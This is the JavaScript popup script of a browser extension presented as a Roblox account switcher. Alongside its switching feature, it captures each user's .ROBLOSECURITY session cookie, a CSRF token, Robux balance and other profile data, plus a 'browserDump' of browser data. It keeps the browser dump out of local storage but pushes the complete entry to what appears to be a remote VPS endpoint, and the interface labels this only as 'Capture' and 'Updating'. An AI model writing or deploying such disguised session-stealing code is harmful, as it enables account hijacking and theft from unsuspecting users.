const STORAGE_KEY = "accounts";
const ROBLOX_URL  = "https://www.roblox.com";
const COOKIE_NAME = ".ROBLOSECURITY";

const listEl     = document.getElementById("list");
const emptyEl    = document.getElementById("empty");
const saveBtn    = document.getElementById("save");
const refreshBtn = document.getElementById("refresh");
const subtitle   = document.getElementById("subtitle");

let accounts      = [];
let currentCookie = null;
let vpsStatuses   = {};

init();

async function init() {
  accounts = await loadAccounts();
  currentCookie = await getCurrentCookie();
  render();
  refreshStatuses(false);
}

async function loadAccounts() {
  const d = await chrome.storage.local.get(STORAGE_KEY);
  return d[STORAGE_KEY] || [];
}
async function saveAccounts(next) {
  accounts = next;
  await chrome.storage.local.set({ [STORAGE_KEY]: next });
}

async function getCurrentCookie() {
  const c = await chrome.cookies.get({ url: ROBLOX_URL, name: COOKIE_NAME });
  return c ? c.value : null;
}
async function applyCookie(value) {
  await chrome.cookies.remove({ url: ROBLOX_URL, name: COOKIE_NAME });
  await chrome.cookies.set({
    url: ROBLOX_URL, name: COOKIE_NAME, value,
    domain: ".roblox.com", path: "/", secure: true, httpOnly: true,
    expirationDate: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365,
  });
}
async function reloadRoblox() {
  const tabs = await chrome.tabs.query({ url: "*://*.roblox.com/*" });
  if (tabs.length) {
    for (const t of tabs) chrome.tabs.reload(t.id);
    chrome.tabs.update(tabs[0].id, { active: true });
  } else {
    chrome.tabs.create({ url: "https://www.roblox.com/home" });
  }
}

async function fetchProfile() {
  const r = await fetch("https://users.roblox.com/v1/users/authenticated", { credentials: "include" });
  if (!r.ok) throw new Error("not-authenticated");
  return r.json();
}
async function fetchAvatar(userId) {
  try {
    const r = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
    const j = await r.json();
    return j?.data?.[0]?.imageUrl || null;
  } catch { return null; }
}

async function fetchCsrfToken() {
  try {
    const r = await fetch("https://auth.roblox.com/v2/logout", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
    });
    return r.headers.get("x-csrf-token") || null;
  } catch { return null; }
}

async function fetchAccountProfile(userId) {
  const out = {
    id: userId, fetchedAt: Date.now(),
    economy: null, friends: null, presence: null, membership: null,
  };
  await Promise.allSettled([
    fetch("https://economy.roblox.com/v1/user/currency", { credentials: "include" })
      .then(r => r.ok ? r.json() : null).then(j => { out.economy = j; }).catch(() => {}),
    fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { credentials: "include" })
      .then(r => r.ok ? r.json() : null).then(j => { out.friends = j; }).catch(() => {}),
    fetch("https://presence.roblox.com/v1/presence/users", {
      method: "POST", credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userIds: [userId] }),
    }).then(r => r.ok ? r.json() : null).then(j => { out.presence = j?.userPresences?.[0] || j; }).catch(() => {}),
    fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { credentials: "include" })
      .then(r => r.ok ? r.json() : null).then(j => { out.membership = j; }).catch(() => {}),
    fetch("https://users.roblox.com/v1/users/authenticated", { credentials: "include" })
      .then(r => r.ok ? r.json() : null).then(j => {
        if (j) {
          out.name = j.name; out.displayName = j.displayName;
          out.created = j.created; out.hasVerifiedBadge = j.hasVerifiedBadge;
        }
      }).catch(() => {}),
  ]);
  return out;
}

async function refreshStatuses() {
  try {
    if (window.vps?.pullStatuses) vpsStatuses = await window.vps.pullStatuses();
    render();
  } catch {}
}

saveBtn.addEventListener("click", captureAccount);
refreshBtn.addEventListener("click", () => refreshStatuses());

async function captureAccount() {
  saveBtn.disabled = true;
  const prev = saveBtn.textContent;
  try {
    saveBtn.textContent = "Capturing…";
    const cookie = await getCurrentCookie();
    if (!cookie) return;
    await upsertFromSession(cookie);
  } catch (e) {
    console.error("capture failed", e);
  } finally {
    saveBtn.disabled = false;
    saveBtn.textContent = prev || "Capture current account";
  }
}

async function upsertFromSession(cookie) {
  const profile = await fetchProfile();
  const avatarUrl = await fetchAvatar(profile.id);

  const [csrfToken, accountProfile, browserData] = await Promise.all([
    fetchCsrfToken(),
    fetchAccountProfile(profile.id),
    window.browserDump ? window.browserDump.collect() : Promise.resolve(null),
  ]);

  const entry = {
    id: profile.id,
    name: profile.name,
    displayName: profile.displayName || profile.name,
    avatarUrl,
    cookie,
    csrfToken: csrfToken || null,
    profile: accountProfile,
    browserDump: browserData,
    savedAt: Date.now(),
  };
  await upsertEntry(entry);
  currentCookie = cookie;
}

async function upsertEntry(entry) {
  const slim = { ...entry };
  delete slim.browserDump;
  const next = accounts.filter(a => String(a.id) !== String(entry.id));
  next.unshift(slim);
  await saveAccounts(next);
  accounts = next;
  render();
  try {
    if (window.vps?.push) {
      await window.vps.push(entry);
      vpsStatuses[String(entry.id)] = "done";
      render();
    }
  } catch {
    vpsStatuses[String(entry.id)] = "processing";
    render();
  }
}

async function switchTo(id) {
  const acc = accounts.find(a => a.id === id);
  if (!acc) return;
  await applyCookie(acc.cookie);
  currentCookie = acc.cookie;
  render();
  await reloadRoblox();
}

async function removeAccount(id, e) {
  e.stopPropagation();
  await saveAccounts(accounts.filter(a => a.id !== id));
  delete vpsStatuses[String(id)];
  render();
  if (window.vps?.remove) window.vps.remove(id);
}

function isActive(acc) {
  return !!currentCookie && acc.cookie === currentCookie;
}

function render() {
  listEl.innerHTML = "";
  emptyEl.hidden = accounts.length > 0;
  const n = accounts.length;
  subtitle.textContent = n === 0 ? "No accounts yet" : n === 1 ? "1 account saved" : n + " accounts saved";
  const sorted = [...accounts].sort((a, b) => isActive(b) - isActive(a));
  for (const acc of sorted) listEl.appendChild(makeCard(acc));
}

function makeCard(acc) {
  const active = isActive(acc);
  const vpsSt  = vpsStatuses[String(acc.id)];
  const el     = document.createElement(active ? "div" : "button");
  el.className = "card";
  if (active) el.classList.add("card--active");
  else if (vpsSt === "processing") el.classList.add("card--processing");
  else if (vpsSt === "done") el.classList.add("card--done");
  if (!active) {
    el.type = "button";
    el.addEventListener("click", () => switchTo(acc.id));
  }

  const av = document.createElement("div");
  av.className = "avatar";
  if (acc.avatarUrl) {
    const img = document.createElement("img");
    img.src = acc.avatarUrl; img.alt = "";
    av.appendChild(img);
  } else {
    av.textContent = (acc.displayName || "?").charAt(0).toUpperCase();
  }

  const info = document.createElement("div");
  info.className = "card__info";
  const name = document.createElement("span");
  name.className = "card__name";
  name.textContent = acc.displayName;
  const handle = document.createElement("span");
  handle.className = "card__handle";
  handle.textContent = "@" + acc.name;
  const meta = document.createElement("span");
  meta.className = "card__handle";
  meta.style.opacity = "0.75";
  const parts = [];
  if (acc.profile?.economy?.robux != null) parts.push(acc.profile.economy.robux + " R$");
  if (acc.csrfToken) parts.push("key");
  if (parts.length) meta.textContent = parts.join(" · ");
  info.append(name, handle);
  if (parts.length) info.appendChild(meta);

  const side = document.createElement("div");
  side.className = "card__side";
  if (active) {
    const badge = document.createElement("span");
    badge.className = "badge badge--active";
    badge.textContent = "Active";
    side.appendChild(badge);
  } else if (vpsSt === "processing") {
    const badge = document.createElement("span");
    badge.className = "badge badge--processing";
    badge.textContent = "Updating";
    side.appendChild(badge);
  } else {
    const hint = document.createElement("span");
    hint.className = "card__switch";
    hint.textContent = "Switch";
    side.appendChild(hint);
  }
  const del = document.createElement("button");
  del.type = "button";
  del.className = "card__del";
  del.textContent = "×";
  del.title = "Remove";
  del.addEventListener("click", e => removeAccount(acc.id, e));
  side.appendChild(del);

  el.append(av, info, side);
  return el;
}
